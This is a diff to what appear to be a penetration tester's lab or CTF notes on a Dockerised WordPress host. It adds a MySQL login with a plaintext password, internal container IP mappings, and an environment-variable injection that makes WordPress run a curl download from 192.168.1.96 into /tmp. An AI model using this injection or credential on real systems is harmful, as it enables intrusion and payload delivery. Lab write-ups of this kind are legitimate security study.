@@ -145,7 +145,7 @@ Found creds in the env, which also points to being in a docker container.
 Mysql
 
 ```
-mysql -u root -p 
+mysql -u dbadmin -p 
 Ba2k3t
 ```
 
@@ -160,3 +160,8 @@ Ba2k3t
 /home/alatar/wordpress/html /var/www/html rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
 /etc/ImageMagick-6/mime.xml
 /usr/local/bin/docker-entrypoint.sh
+
+172.17.0.2      mysql a9400b1a26c0 wordpressdb
+172.17.0.3      a5610f5f2480
+
+export WORDPRESS_CONFIG_EXTRA='curl 192.168.1.96/test -o /tmp/test'
